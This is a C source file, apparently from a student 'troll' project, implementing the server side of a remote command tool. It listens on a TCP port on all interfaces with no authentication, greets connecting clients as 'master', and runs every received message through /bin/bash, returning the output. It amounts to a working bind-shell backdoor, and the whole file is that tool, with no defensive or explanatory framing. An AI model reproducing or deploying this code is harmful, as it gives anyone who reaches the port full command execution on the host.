/* ******************************--------************************************ */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_cli.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
/*   Updated: 2018/mm/dd hh:mm:ss by someone          ###   ########.troll    */
/*                                                                            */
/* ******************************--------************************************ */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "server.h"
#include "libft.h"
#include "get_next_line.h"

static void		exec_command(char *msg, char **env, int outfd)
{
	pid_t			pid;
	char			*bashav[2];
	int				fd[2];
	int				fd2[2];

	bashav[0] = "bash";
	bashav[1] = NULL;
	pipe(fd);
	pipe(fd2);
	ft_putstr_fd(msg, fd[1]);
	if ((pid = fork()) == -1)
		return ;
	if (pid == 0)
	{
		prepare_pipe_child(fd, fd2);
		execve("/bin/bash", bashav, env);
		exit(127);
	}
	close(fd[1]);
	close(fd[0]);
	close(fd2[1]);
	send_output(fd2[0], outfd);
	wait(NULL);
}

static int		get_admin_message(int sockfd, int newsockfd, char **env)
{
	struct pollfd		pfd;
	char				msg[256];

	pfd.fd = sockfd;
	pfd.events = POLLIN | POLLHUP | POLLRDNORM;
	pfd.revents = 0;
	ft_putendl("Welcome, master");
	while (pfd.revents == 0)
	{
		if (poll(&pfd, 1, 100) > 0 && check_recv(sockfd))
			break ;
		ft_bzero(msg, sizeof(msg));
		if (read(newsockfd, msg, sizeof(msg) - 1))
		{
			if (ft_strcmp(msg, "sexit") == 0)
			{
				close(newsockfd);
				return (FALSE);
			}
			exec_command(msg, env, newsockfd);
		}
	}
	close(newsockfd);
	return (TRUE);
}

static void		setup_sockaddr(t_sockaddr_in *dest)
{
	ft_bzero(dest, sizeof(t_sockaddr_in));
	dest->sin_family = AF_INET;
	dest->sin_addr.s_addr = INADDR_ANY;
	dest->sin_port = htons(TROLL_PORT);
}

int				main(int ac, char **av, char **env)
{
	int					sockfd;
	int					newsockfd;
	t_sockaddr_in		serv_addr;
	t_sockaddr_in		client_addr;
	socklen_t			len;

	(void)ac;
	(void)av;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return (ft_returnmsg("Err socket", STDERR_FILENO, EXIT_FAILURE));
	setup_sockaddr(&serv_addr);
	if (bind(sockfd, (t_sockaddr*)&serv_addr, sizeof(t_sockaddr_in)) == -1)
		return (ft_returnmsg("Err bind", STDERR_FILENO, EXIT_FAILURE));
	while (TRUE)
	{
		listen(sockfd, 1);
		len = sizeof(t_sockaddr_in);
		if ((newsockfd = accept(sockfd, (t_sockaddr*)&client_addr, &len)) == -1
			|| !get_admin_message(sockfd, newsockfd, env))
			break ;
	}
	close(sockfd);
	return (EXIT_SUCCESS);
}
